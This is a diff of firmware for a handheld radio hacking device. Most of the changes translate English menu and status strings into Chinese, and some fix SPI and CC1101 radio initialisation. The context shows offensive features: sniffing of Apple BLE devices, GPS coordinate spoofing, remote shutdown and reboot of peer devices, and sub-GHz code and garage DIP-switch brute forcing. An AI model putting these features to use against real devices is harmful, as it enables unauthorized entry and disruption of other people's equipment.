-    sp.setCursor(4, y); sp.printf("model 0x%04X  lid#%d", d.podModel, d.lid); y += 12;
+    sp.setCursor(4, y); sp.printf("型号 0x%04X  开盖#%d", d.podModel, d.lid); y += 12;
   }
   if (d.hasNearby) {
     sp.setTextColor(TFT_GREEN, TFT_BLACK);
-    sp.setCursor(4, y); sp.printf("state: %s", ac_activity(d.action)); y += 11;
+    sp.setCursor(4, y); sp.printf("状态: %s", ac_activity(d.action)); y += 11;
     sp.setTextColor(0xCE79, TFT_BLACK);
     sp.setCursor(4, y);
-    sp.printf("wifi:%s airdrop-rx:%s watch:%s",
-      (d.dataFlags & 0x04) ? "on" : "off",
-      (d.statusFlags & 0x04) ? "yes" : "no",
-      (d.dataFlags & 0x20) ? "lock" : "-");
+    sp.printf("WiFi:%s 隔空投送:%s 手表:%s",
+      (d.dataFlags & 0x04) ? "开" : "关",
+      (d.statusFlags & 0x04) ? "是" : "否",
+      (d.dataFlags & 0x20) ? "锁定" : "-");
     y += 12;
   }
   if (d.hasHotspot) {
     sp.setTextColor(TFT_ORANGE, TFT_BLACK);
-    sp.setCursor(4, y); sp.printf("hotspot %d%% %s %d bars", d.hsBatt, ac_cell(d.hsCell), d.hsBars); y += 12;
+    sp.setCursor(4, y); sp.printf("热点 %d%% %s %d格信号", d.hsBatt, ac_cell(d.hsCell), d.hsBars); y += 12;
   }
   if (d.hasAirplay) {
     sp.setTextColor(TFT_ORANGE, TFT_BLACK);
@@ -41835,9 +42073,9 @@ void ac_draw_detail(M5Canvas* sprite, bool use_sprite, int devIndex, int pos, in
 
   sp.fillRect(0, H - 13, W, 13, AC_BAR);
   sp.setTextColor(TFT_YELLOW, AC_BAR);
-  sp.setCursor(4, H - 11); sp.print(";/. prev/next");
+  sp.setCursor(4, H - 11); sp.print(";/. 上下切换");
   sp.setTextColor(TFT_GREEN, AC_BAR);
-  sp.setCursor(184, H - 11); sp.print("BACK");
+  sp.setCursor(184, H - 11); sp.print("BACK=返回");
 
   if (use_sprite) sprite->pushSprite(0, 0);
 }
@@ -41924,7 +42162,7 @@ void appleContinuityMenu() {
   scan->clearResults();
   if (sprite) { sprite->deleteSprite(); delete sprite; }
   releaseBLE();
-  waitAndReturnToMenu("Apple sniff stopped");
+  waitAndReturnToMenu("Apple 嗅探已停止");
 }
 
 // =====================================================================
@@ -42072,8 +42310,12 @@ bool totem_lora_transmitting = false;
 void IRAM_ATTR totem_lora_isr() { totem_lora_irq_flag = true; }
 
 bool totem_lora_start() {
+    pinMode(12, OUTPUT); digitalWrite(12, HIGH); // SD_CS
+    pinMode(5, OUTPUT);  digitalWrite(5, HIGH);  // CC_CS
+    pinMode(6, OUTPUT);  digitalWrite(6, HIGH);  // NFC_CS
     pinMode(TOTEM_LORA_NSS, OUTPUT);
     digitalWrite(TOTEM_LORA_NSS, HIGH);
+    SPI.begin(40, 39, 14, -1);
     // Probe SPI : lit 3x un registre SX126x. Une vraie puce est deterministe
     // (lectures identiques) ; sans HAT le MISO flotte -> lectures incoherentes ou
     // 0000/FFFF. On rejette VITE dans ce cas pour NE PAS bloquer sur begin()
@@ -42974,7 +43216,7 @@ void totemCompassMenu() {
     if (esp_now_init() != ESP_OK) {
         M5.Display.clear(TFT_BLACK);
         M5.Display.setTextColor(TFT_RED, TFT_BLACK);
-        M5.Display.setCursor(10, 60); M5.Display.print("ESP-NOW init failed!");
+        M5.Display.setCursor(10, 60); M5.Display.print("ESP-NOW 初始化失败!");
         M5.Display.display(); delay(2000);
         totem_stop_ble();
         esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
@@ -43009,8 +43251,8 @@ void totemCompassMenu() {
     auto& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
 
     // ═══════════════ OUTER LOOP (mode selection) ═══════════════
-    const char* totem_items[] = {"Scanner", "Compass (Need GPS)", "Spoofer",
-        "DemiGod Controller", "Pair Manager", "Capabilities", "BLE App Status"};
+    const char* totem_items[] = {"节点扫描", "指南针 (需GPS)", "坐标欺骗",
+        "半神控制 (DemiGod)", "配对管理", "设备能力探测", "BLE 应用状态"};
     const int totem_item_count = 7;
     const int totem_lineH = 16;
     const int totem_listY = 18;
@@ -43030,10 +43272,10 @@ void totemCompassMenu() {
             sp.fillScreen(TFT_BLACK);
             sp.fillRect(0, 0, W, 16, 0x0841);
             sp.drawFastHLine(0, 16, W, violet);
-            sp.setTextFont(1);
-            sp.setTextSize(1.5);
+            evilKeepCnFont(sp);
+            evilSetCnFont(sp, 1.5);
             sp.setTextColor(violet, 0x0841); sp.setCursor(40, 2); sp.print("Totem Compass");
-            sp.setTextSize(1.5);
+            evilSetCnFont(sp, 1.5);
             for (int i = 0; i < totem_maxVis && (totem_start + i) < totem_item_count; i++) {
                 int idx = totem_start + i;
                 int y = totem_listY + i * totem_lineH;
@@ -43046,11 +43288,11 @@ void totemCompassMenu() {
                 sp.setCursor(10, y + 2); sp.print(totem_items[idx]);
             }
             sp.fillRect(0, H - 14, W, 14, 0x0841);
-            sp.setTextSize(1);
+            evilSetCnFont(sp, 1);
             sp.setTextColor(totem_ble_active ? TFT_GREEN : TFT_DARKGREEN, 0x0841);
-            sp.setCursor(4, H - 12); sp.printf("[%d peers] BLE:%s",
-                totem_peer_count, totem_ble_active ? (totem_ble_connected ? "CONN" : "ADV") : "off");
-            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(160, H - 12); sp.print(";/. ENT BACK");
+            sp.setCursor(4, H - 12); sp.printf("[%d 节点] BLE:%s",
+                totem_peer_count, totem_ble_active ? (totem_ble_connected ? "已连接" : "广播") : "关");
+            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(160, H - 12); sp.print(";/. ENT BACK=退出");
             if (use_sprite) sprite->pushSprite(0, 0);
             totem_need_draw = false;
         }
@@ -43090,17 +43332,17 @@ void totemCompassMenu() {
                 uint16_t good = sp.color565(90, 255, 130);
                 sp.fillRect(0, 0, W, 13, 0x0841);
                 sp.setTextColor(0xFC00); sp.setCursor(2, 3);
-                sp.printf("TOTEM BLE %s", totem_ble_connected ? "LINKED" : "Advertising");
+                sp.printf("TOTEM BLE %s", totem_ble_connected ? "已连接" : "广播中");
                 sp.drawFastHLine(0, 13, W, 0x03E0);
                 int y = 18;
                 sp.setTextColor(good);
-                sp.setCursor(2, y); sp.printf("App: %s", totem_ble_connected ? "CONNECTED" : "waiting..."); y += 11;
+                sp.setCursor(2, y); sp.printf("App: %s", totem_ble_connected ? "已连接" : "等待连接..."); y += 11;
                 sp.setTextColor(TFT_WHITE);
                 int peerCount = 0, bondCount = 0;
                 for (int i = 0; i < TOTEM_MAX_PEERS; i++) {
                     if (totem_peers[i].active) { peerCount++; if (totem_peers[i].bonded) bondCount++; }
                 }
-                sp.setCursor(2, y); sp.printf("Peers: %d  Bonded: %d", peerCount, bondCount); y += 11;
+                sp.setCursor(2, y); sp.printf("节点: %d  已绑定: %d", peerCount, bondCount); y += 11;
                 int shown = 0;
                 for (int i = 0; i < TOTEM_MAX_PEERS && shown < 5; i++) {
                     if (!totem_peers[i].active) continue;
@@ -43114,11 +43356,11 @@ void totemCompassMenu() {
                 }
                 if (peerCount == 0) {
                     sp.setTextColor(TFT_DARKGREY);
-                    sp.setCursor(2, y); sp.print("Scan peers in mode 1-6 first"); y += 10;
+                    sp.setCursor(2, y); sp.print("请先在模式 1-6 中扫描节点"); y += 10;
                 }
                 sp.fillRect(0, H-14, W, 14, 0x0841);
                 sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
-                sp.print("BACK=menu  BLE+ESP-NOW active");
+                sp.print("BACK=菜单  BLE+ESP-NOW 运行中");
                 if (use_sprite) sprite->pushSprite(0, 0);
             }
             delay(10);
@@ -43143,9 +43385,9 @@ void totemCompassMenu() {
     if (compass_mode && !gps.location.isValid()) {
         M5.Display.clear(TFT_BLACK);
         M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
-        M5.Display.setCursor(10, 30); M5.Display.print("Waiting for GPS fix...");
-        M5.Display.setCursor(10, 50); M5.Display.print("Compass will activate");
-        M5.Display.setCursor(10, 62); M5.Display.print("when satellites found.");
+        M5.Display.setCursor(10, 30); M5.Display.print("正在等待 GPS 定位...");
+        M5.Display.setCursor(10, 50); M5.Display.print("搜到卫星后将自动");
+        M5.Display.setCursor(10, 62); M5.Display.print("启用指南针功能。");
         M5.Display.display(); delay(1000);
     }
 
@@ -43153,11 +43395,11 @@ void totemCompassMenu() {
     float spoof_lat = 48.8566f, spoof_lon = 2.3522f;
     if (spoof_mode) {
         M5.Display.clear(TFT_BLACK);
-        M5.Display.setTextSize(1); M5.Display.setTextFont(1);
+        evilSetCnFont(M5.Display, 1); evilKeepCnFont(M5.Display);
         M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
-        M5.Display.setCursor(10, 10); M5.Display.print("Spoofer: enter coordinates");
+        M5.Display.setCursor(10, 10); M5.Display.print("坐标欺骗: 请输入经纬度");
         M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
-        M5.Display.setCursor(10, 45); M5.Display.print("Latitude (48.8566):");
+        M5.Display.setCursor(10, 45); M5.Display.print("纬度 Latitude (48.8566):");
         M5.Display.display();
         String latStr = ""; unsigned long lk = 0; bool latDirty = true;
         while (true) {
@@ -43176,7 +43418,7 @@ void totemCompassMenu() {
         }
         if (latStr.length() > 0) spoof_lat = latStr.toFloat(); keyRelease();
         M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
-        M5.Display.setCursor(10, 80); M5.Display.print("Longitude (2.3522):");
+        M5.Display.setCursor(10, 80); M5.Display.print("经度 Longitude (2.3522):");
         M5.Display.display();
         String lonStr = ""; bool lonDirty = true;
         while (true) {
@@ -43274,9 +43516,9 @@ void totemCompassMenu() {
                 M5Cardputer.Display.fillScreen(TFT_BLACK);
                 M5Cardputer.Display.setTextColor(TFT_GREEN);
                 M5Cardputer.Display.setCursor(5, 20);
-                M5Cardputer.Display.printf("Name: %s", totem_device_name);
+                M5Cardputer.Display.printf("当前名称: %s", totem_device_name);
                 M5Cardputer.Display.setCursor(5, 40);
-                M5Cardputer.Display.print("New name (max 20):");
+                M5Cardputer.Display.print("新名称 (最多20字符):");
                 String newName = getUserInput();
                 if (newName.length() > 0 && newName.length() <= TOTEM_NAME_MAX) {
                     strncpy(totem_device_name, newName.c_str(), TOTEM_NAME_MAX);
@@ -43306,7 +43548,7 @@ void totemCompassMenu() {
                 if (imu_available) {
                     sp.fillRect(0, 58, W, 16, TFT_BLACK);
                     sp.setTextColor(TFT_YELLOW); sp.setCursor(24, 62);
-                    sp.print("Calibrating... hold still");
+                    sp.print("正在校准... 请保持静止");
                     if (use_sprite) sprite->pushSprite(0, 0);
                     float sum = 0; int ns = 0; uint32_t t0 = millis();
                     while (millis() - t0 < 800) {
@@ -43455,13 +43697,13 @@ void totemCompassMenu() {
 
         // ═══════════════ DRAW ═══════════════
         sp.fillScreen(TFT_BLACK);
-        sp.setTextSize(1); sp.setTextFont(1);
+        evilSetCnFont(sp, 1); evilKeepCnFont(sp);
         uint16_t good = sp.color565(90, 255, 130);
         uint16_t warn = sp.color565(255, 80, 80);
 
         // ── Header (all pages) ──
-        String state = pairing ? (totem_bond_latched ? "PAIR>" : "PAIR.") :
-                       (totem_group_until ? "GRP" : "idle");
+        String state = pairing ? (totem_bond_latched ? "配对>" : "配对.") :
+                       (totem_group_until ? "群组" : "空闲");
         sp.fillRect(0, 0, W, 13, 0x0841);
         sp.setTextColor(totem_sos ? warn : (pairing ? good : 0xFC00));
         sp.setCursor(2, 3);
@@ -43507,11 +43749,11 @@ void totemCompassMenu() {
             }
             if (oc == 0) {
                 sp.setTextColor(TFT_YELLOW);
-                sp.setCursor(10, 55); sp.print("Waiting for Totem devices...");
+                sp.setCursor(10, 55); sp.print("正在等待 Totem 设备...");
             }
             sp.fillRect(0, H-14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
-            sp.print(";/. ENTER=info s=SOS r=name");
+            sp.print(";/. ENTER=详情 s=SOS r=改名");
         }
 
         // ═══ PAGE: INFO ═══
@@ -43521,20 +43763,20 @@ void totemCompassMenu() {
                 p.mac[0],p.mac[1],p.mac[2],p.mac[3],p.mac[4],p.mac[5]);
             sp.setTextColor(good);
             sp.setCursor(2, y); sp.printf("MAC  %s", ms); y += 11;
-            sp.setCursor(2, y); sp.printf("Name %s", p.name[0] ? p.name : "--"); y += 11;
+            sp.setCursor(2, y); sp.printf("名称 %s", p.name[0] ? p.name : "--"); y += 11;
             sp.setTextColor(TFT_WHITE);
-            sp.setCursor(2, y); sp.printf("RSSI %d  Cat %d", p.rssi, p.cat); y += 11;
-            sp.setCursor(2, y); sp.printf("Lat  %.5f", p.lat); y += 11;
-            sp.setCursor(2, y); sp.printf("Lon  %.5f", p.lon); y += 11;
-            sp.setCursor(2, y); sp.printf("Hops %d  SOS %s", p.hops, p.sos ? "YES" : "no"); y += 11;
-            sp.setCursor(2, y); sp.printf("Bond %s  Seen %lus",
-                p.bonded ? "YES" : "no", (millis() - p.last_seen) / 1000); y += 11;
+            sp.setCursor(2, y); sp.printf("信号 %d  类别 %d", p.rssi, p.cat); y += 11;
+            sp.setCursor(2, y); sp.printf("纬度 %.5f", p.lat); y += 11;
+            sp.setCursor(2, y); sp.printf("经度 %.5f", p.lon); y += 11;
+            sp.setCursor(2, y); sp.printf("跳数 %d  SOS %s", p.hops, p.sos ? "是" : "否"); y += 11;
+            sp.setCursor(2, y); sp.printf("绑定 %s  发现 %lus",
+                p.bonded ? "是" : "否", (millis() - p.last_seen) / 1000); y += 11;
             sp.setCursor(2, y);
-            if (p.distance >= 1000) sp.printf("Dist %.1fkm %s", p.distance / 1000.0f, p.distance > 0 ? totem_dir_str(p.bearing) : "--");
-            else sp.printf("Dist %.0fm %s", p.distance, p.distance > 0 ? totem_dir_str(p.bearing) : "--");
+            if (p.distance >= 1000) sp.printf("距离 %.1fkm %s", p.distance / 1000.0f, p.distance > 0 ? totem_dir_str(p.bearing) : "--");
+            else sp.printf("距离 %.0fm %s", p.distance, p.distance > 0 ? totem_dir_str(p.bearing) : "--");
             sp.fillRect(0, H-14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
-            sp.print("b=bond u=unbond c=compass BACK");
+            sp.print("b=绑定 u=解绑 c=罗盘 BACK=返回");
         }
 
         // ═══ PAGE: COMPASS ═══
@@ -43596,10 +43838,10 @@ void totemCompassMenu() {
                 int dy = cy - (int)(cosf(rad + 2.8f) * 10);
                 sp.fillTriangle(ax, ay, bx, by, dx, dy, arrowCol);
                 sp.fillCircle(cx, cy, 2, TFT_WHITE);
-                if (!hasHeading) { sp.setTextColor(sp.color565(255,140,0)); sp.setCursor(cx - 16, cy + cr + 10); sp.print("N-up"); }
+                if (!hasHeading) { sp.setTextColor(sp.color565(255,140,0)); sp.setCursor(cx - 16, cy + cr + 10); sp.print("北朝上"); }
             } else {
                 sp.setTextColor(TFT_YELLOW);
-                sp.setCursor(cx - 20, cy - 3); sp.print("No GPS");
+                sp.setCursor(cx - 20, cy - 3); sp.print("无GPS");
             }
 
             // Peer info + distance above compass
@@ -43617,40 +43859,40 @@ void totemCompassMenu() {
             sp.setCursor(2, y);
             if (headSrc == 1) sp.printf("GPS %.0f", devHeading);
             else if (headSrc == 2) sp.printf("IMU %.0f", devHeading);
-            else { sp.setTextColor(TFT_YELLOW); sp.print("No heading: point top North"); }
+            else { sp.setTextColor(TFT_YELLOW); sp.print("无航向: 请将顶部朝北"); }
 
             sp.fillRect(0, H - 14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB); sp.setCursor(2, H - 11);
-            sp.print("n=calibrate(North) BACK=info");
+            sp.print("n=校准(朝北) BACK=详情");
         }
 
         // ═══ PAGE: DEMIGOD ═══
         else if (page == TPAGE_DEMIGOD) {
             const uint8_t* c = TOTEM_DG_COLORS[dg.color];
-            String tgt = dg.all ? "ALL (broadcast)" : (dg.hasPeer ?
-                String("peer ") + String(dg.peer[4],HEX) + ":" + String(dg.peer[5],HEX) : "ALL");
+            String tgt = dg.all ? "全部 (广播)" : (dg.hasPeer ?
+                String("节点 ") + String(dg.peer[4],HEX) + ":" + String(dg.peer[5],HEX) : "全部");
             sp.setTextColor(good);
-            sp.setCursor(2, y); sp.print("-- DEMI-GOD --"); y += 12;
+            sp.setCursor(2, y); sp.print("-- 半神控制 (DEMI-GOD) --"); y += 12;
             sp.setTextColor(dg.all ? warn : good);
-            sp.setCursor(2, y); sp.printf("Target: %s", tgt.c_str()); y += 12;
+            sp.setCursor(2, y); sp.printf("目标: %s", tgt.c_str()); y += 12;
             sp.setTextColor(TFT_WHITE);
-            sp.setCursor(2, y); sp.printf("Colour: (%d,%d,%d)", c[0], c[1], c[2]); y += 14;
+            sp.setCursor(2, y); sp.printf("颜色: (%d,%d,%d)", c[0], c[1], c[2]); y += 14;
             sp.setTextColor(TFT_CYAN);
-            sp.setCursor(2, y); sp.print("t=target c=colour"); y += 11;
-            sp.setCursor(2, y); sp.print("f=FIND  o=OFF  r=REBOOT"); y += 11;
+            sp.setCursor(2, y); sp.print("t=切换目标 c=切换颜色"); y += 11;
+            sp.setCursor(2, y); sp.print("f=闪烁查找  o=关机  r=重启"); y += 11;
             if (dg.pending) {
                 sp.setTextColor(warn);
-                sp.setCursor(2, y); sp.printf("CONFIRM: press %c again!", dg.pending);
+                sp.setCursor(2, y); sp.printf("二次确认: 请再按一次 %c!", dg.pending);
             }
             sp.fillRect(0, H-14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
-            sp.print(";/.=tgt t=ALL f o r BACK=menu");
+            sp.print(";/.=目标 t=全部 f o r BACK=菜单");
         }
 
         // ═══ PAGE: LOG ═══
         else if (page == TPAGE_LOG) {
             sp.setTextColor(good);
-            sp.setCursor(2, y); sp.print("-- RADIO LOG --"); y += 12;
+            sp.setCursor(2, y); sp.print("-- 无线日志 --"); y += 12;
             for (int oi = 0; oi < oc && y < H - 14; oi++) {
                 TotemPeer& p = totem_peers[order[oi]];
                 sp.setTextColor(TFT_WHITE); sp.setCursor(2, y);
@@ -43661,16 +43903,16 @@ void totemCompassMenu() {
             }
             sp.fillRect(0, H-14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
-            sp.print(";/.=scroll x=clear BACK=menu");
+            sp.print(";/.=滚动 x=清空 BACK=菜单");
         }
 
         // ═══ PAGE: PAIR MANAGER ═══
         else if (page == TPAGE_PAIR_DIAG) {
             sp.setTextColor(good);
-            sp.setCursor(2, y); sp.print("-- PAIR MANAGER --"); y += 11;
+            sp.setCursor(2, y); sp.print("-- 配对管理 --"); y += 11;
             sp.setTextColor(TFT_WHITE);
-            sp.setCursor(2, y); sp.printf("State: %s  Bonds: %lu",
-                pairing ? (totem_bond_latched ? "LATCHED" : "ARMED") : "idle",
+            sp.setCursor(2, y); sp.printf("状态: %s  已绑定: %lu",
+                pairing ? (totem_bond_latched ? "已锁定" : "待命") : "空闲",
                 totem_stats.bonds); y += 11;
             for (int oi = 0; oi < oc && y < H - 14; oi++) {
                 TotemPeer& p = totem_peers[order[oi]];
@@ -43686,13 +43928,13 @@ void totemCompassMenu() {
             }
             sp.fillRect(0, H-14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
-            sp.print(";/. b=bond u=unbond p=pair");
+            sp.print(";/. b=绑定 u=解绑 p=配对");
         }
 
         // ═══ PAGE: CAPABILITIES ═══
         else if (page == TPAGE_CAPABILITIES) {
             sp.setTextColor(good);
-            sp.setCursor(2, y); sp.print("-- CAPABILITIES --"); y += 12;
+            sp.setCursor(2, y); sp.print("-- 节点能力 --"); y += 12;
             for (int oi = 0; oi < oc && y < H - 14; oi++) {
                 TotemPeer& p = totem_peers[order[oi]];
                 sp.setTextColor(TFT_WHITE); sp.setCursor(2, y);
@@ -43703,20 +43945,20 @@ void totemCompassMenu() {
             }
             sp.fillRect(0, H-14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
-            sp.print("ENTER=refresh  BACK=menu");
+            sp.print("ENTER=刷新  BACK=菜单");
         }
 
         // ═══ PAGE: BLE STATUS ═══
         else if (page == TPAGE_BLE_STATUS) {
             sp.setTextColor(good);
-            sp.setCursor(2, y); sp.print("-- BLE APP STATUS --"); y += 12;
+            sp.setCursor(2, y); sp.print("-- BLE 应用状态 --"); y += 12;
             sp.setTextColor(TFT_WHITE);
-            sp.setCursor(2, y); sp.printf("BLE: %s", totem_ble_active ? "ACTIVE" : "OFF"); y += 11;
-            sp.setCursor(2, y); sp.printf("App: %s", totem_ble_connected ? "CONNECTED" : "waiting..."); y += 11;
-            sp.setCursor(2, y); sp.printf("Name: \"Totem\""); y += 11;
-            sp.setCursor(2, y); sp.printf("Schema: %d  Mode: %d", totem_ble_frame_schema, totem_ble_conn_mode); y += 11;
+            sp.setCursor(2, y); sp.printf("BLE: %s", totem_ble_active ? "开启" : "关闭"); y += 11;
+            sp.setCursor(2, y); sp.printf("App: %s", totem_ble_connected ? "已连接" : "等待中..."); y += 11;
+            sp.setCursor(2, y); sp.printf("名称: \"Totem\""); y += 11;
+            sp.setCursor(2, y); sp.printf("结构: %d  模式: %d", totem_ble_frame_schema, totem_ble_conn_mode); y += 11;
             sp.setTextColor(TFT_DARKGREEN);
-            sp.setCursor(2, y); sp.printf("Peers synced: %d bonded", (int)totem_ble_last_peer_sync); y += 11;
+            sp.setCursor(2, y); sp.printf("已同步绑定节点: %d", (int)totem_ble_last_peer_sync); y += 11;
             sp.setCursor(2, y); sp.printf("MAC: %02X:%02X:%02X:%02X:%02X:%02X",
                 totem_my_mac[0], totem_my_mac[1], totem_my_mac[2],
                 totem_my_mac[3], totem_my_mac[4], totem_my_mac[5]); y += 11;
@@ -43724,7 +43966,7 @@ void totemCompassMenu() {
             sp.setCursor(2, y); sp.print("UUID: 7913b588-0000-...");
             sp.fillRect(0, H-14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
-            sp.print("BACK=menu");
+            sp.print("BACK=菜单");
         }
 
         if (use_sprite) sprite->pushSprite(0, 0);
@@ -43763,6 +44005,12 @@ totem_cleanup:
 #define CC_SCLK  40
 #define CC_GDO0  15
 #define CC_RFSW0 13
+#ifndef NFC_CS
+#define NFC_CS   6
+#endif
+#ifndef SD_CS
+#define SD_CS    12
+#endif
 
 // CC1101 SPI strobes
 #define CC_SRES  0x30
@@ -43824,6 +44072,8 @@ bool cc_opened = false;
 float cc_freq_mhz = 433.92f;
 
 void cc_spi_begin() {
+    digitalWrite(NFC_CS, HIGH);
+    digitalWrite(SD_CS, HIGH);
     cc_spi->beginTransaction(SPISettings(500000, MSBFIRST, SPI_MODE0));
     digitalWrite(CC_CS, LOW);
 }
@@ -43980,14 +44230,40 @@ void cc_set_frequency(float freq_mhz) {
 
 bool cc_open() {
     if (cc_opened) return true;
+    cardgps.end(); // Stop GPS UART to release GPIO 15 (GDO0) and 13 (RFSW0)
+    pinMode(SD_CS, OUTPUT);
+    digitalWrite(SD_CS, HIGH);     // Deselect SD
+    pinMode(NFC_CS, OUTPUT);
+    digitalWrite(NFC_CS, HIGH);    // Deselect NFC ST25R3916
     pinMode(CC_CS, OUTPUT);
+    digitalWrite(CC_CS, HIGH);
     pinMode(CC_GDO0, INPUT);
     pinMode(CC_RFSW0, OUTPUT);
+
+    // Ensure hardware SPI is bound to Cardputer SPI pins
+    SPI.begin(40, 39, 14, -1);
+
+    // CC1101 manual reset sequence
     digitalWrite(CC_CS, HIGH);
+    delayMicroseconds(50);
+    digitalWrite(CC_CS, LOW);
+    delayMicroseconds(50);
+    digitalWrite(CC_CS, HIGH);
+    delayMicroseconds(100);
+
     cc_strobe(CC_SRES);
-    delay(10);
-    uint8_t ver = cc_read_status(CC_VERSION);
-    if (ver == 0x00 || ver == 0xFF) return false;
+    delay(15);
+
+    uint8_t ver = 0;
+    for (int retry = 0; retry < 10; retry++) {
+        ver = cc_read_status(CC_VERSION);
+        if (ver != 0x00 && ver != 0xFF) break;
+        delay(10);
+    }
+    if (ver == 0x00 || ver == 0xFF) {
+        Serial.printf("[CC1101] Version check failed: 0x%02X\n", ver);
+        return false;
+    }
     cc_apply_preset(cc_preset_idx);
     cc_set_frequency(cc_freq_mhz);
     cc_opened = true;
@@ -44000,6 +44276,9 @@ void cc_close() {
     cc_strobe(CC_SIDLE);
     digitalWrite(CC_CS, HIGH);
     cc_opened = false;
+    if (gpsRxPin == 15 && gpsTxPin == 13) {
+        cardgps.begin(baudrate_gps, SERIAL_8N1, gpsRxPin, gpsTxPin);
+    }
 }
 
 void cc_sleep_for_nfc() {
@@ -44985,7 +45264,7 @@ void cc_brute_force(const SubGhzDecoded& base_sig, LovyanGFX& sp, bool use_sprit
     if (base_sig.bit_count > 16 || base_sig.bit_count < 1) {
         sp.fillScreen(TFT_BLACK);
         sp.setTextColor(TFT_RED, TFT_BLACK);
-        sp.setCursor(10, 55); sp.printf("Can't brute %d bits (%d codes)", base_sig.bit_count, total);
+        sp.setCursor(10, 55); sp.printf("无法爆破 %d 位 (%d 个码)", base_sig.bit_count, total);
         if (use_sprite) sprite->pushSprite(0, 0);
         delay(2000); return;
     }
@@ -45045,16 +45324,16 @@ void cc_brute_force(const SubGhzDecoded& base_sig, LovyanGFX& sp, bool use_sprit
             sp.fillScreen(TFT_BLACK);
             sp.fillRect(0, 0, W, 14, 0x0841);
             sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
-            sp.printf("Brute %s %d-bit", sig.protocol, sig.bit_count);
+            sp.printf("爆破 %s %d位", sig.protocol, sig.bit_count);
             sp.setTextColor(TFT_GREEN, TFT_BLACK);
-            sp.setCursor(10, 22); sp.printf("Code: 0x%0*X / 0x%X", (sig.bit_count+3)/4, code, total-1);
+            sp.setCursor(10, 22); sp.printf("码值: 0x%0*X / 0x%X", (sig.bit_count+3)/4, code, total-1);
             sp.fillRect(10, 42, 220, 12, 0x2104);
             sp.fillRect(10, 42, pct * 220 / 100, 12, TFT_GREEN);
-            sp.setCursor(10, 60); sp.printf("%d%% — %d sent", pct, sent);
-            sp.setCursor(10, 76); sp.printf("Elapsed: %lus  ETA: %lus", elapsed, eta);
+            sp.setCursor(10, 60); sp.printf("%d%% — 已发 %d", pct, sent);
+            sp.setCursor(10, 76); sp.printf("用时: %lus  剩余: %lus", elapsed, eta);
             sp.fillRect(0, H-14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-            sp.print("BACK=stop");
+            sp.print("BACK=停止");
             if (use_sprite) sprite->pushSprite(0, 0);
         }
     }
@@ -45069,10 +45348,10 @@ void cc_brute_force(const SubGhzDecoded& base_sig, LovyanGFX& sp, bool use_sprit
 
     sp.fillScreen(TFT_BLACK);
     sp.setTextColor(TFT_GREEN, TFT_BLACK);
-    sp.setCursor(10, 50); sp.printf("Done! %d codes sent", sent);
-    sp.setCursor(10, 70); sp.printf("%lus total", (millis() - t_start) / 1000);
+    sp.setCursor(10, 50); sp.printf("完成! 已发 %d 个码", sent);
+    sp.setCursor(10, 70); sp.printf("总用时 %lus", (millis() - t_start) / 1000);
     sp.fillRect(0, H-14, W, 14, 0x0841);
-    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
+    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=菜单");
     if (use_sprite) sprite->pushSprite(0, 0);
     while (true) {
         M5.update(); cardUpdate();
@@ -45133,16 +45412,16 @@ void cc_brute_garage_dip(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
             sp.fillScreen(TFT_BLACK);
             sp.fillRect(0, 0, W, 14, 0x0841);
             sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
-            sp.print("Garage DIP brute (MPSTF2E)");
+            sp.print("车库拨码爆破 (MPSTF2E)");
             sp.setTextColor(TFT_GREEN, TFT_BLACK);
             sp.setCursor(10, 22); sp.printf("DIP: %03X / 3FF", code);
             sp.fillRect(10, 42, 220, 12, 0x2104);
             sp.fillRect(10, 42, pct * 220 / 100, 12, TFT_GREEN);
-            sp.setCursor(10, 60); sp.printf("%d%% - %d sent", pct, sent);
-            sp.setCursor(10, 76); sp.printf("Elapsed: %lus  ETA: %lus", elapsed, eta);
+            sp.setCursor(10, 60); sp.printf("%d%% - 已发 %d", pct, sent);
+            sp.setCursor(10, 76); sp.printf("用时: %lus  剩余: %lus", elapsed, eta);
             sp.fillRect(0, H-14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-            sp.print("BACK=stop");
+            sp.print("BACK=停止");
             if (use_sprite) sprite->pushSprite(0, 0);
         }
     }
@@ -45150,10 +45429,10 @@ void cc_brute_garage_dip(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
     // cc_send_raw a deja restaure la RF (preset + freq) apres chaque emission.
     sp.fillScreen(TFT_BLACK);
     sp.setTextColor(TFT_GREEN, TFT_BLACK);
-    sp.setCursor(10, 50); sp.printf("Done! %d codes sent", sent);
-    sp.setCursor(10, 70); sp.printf("%lus total", (millis() - t_start) / 1000);
+    sp.setCursor(10, 50); sp.printf("完成! 已发 %d 个码", sent);
+    sp.setCursor(10, 70); sp.printf("总用时 %lus", (millis() - t_start) / 1000);
     sp.fillRect(0, H-14, W, 14, 0x0841);
-    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
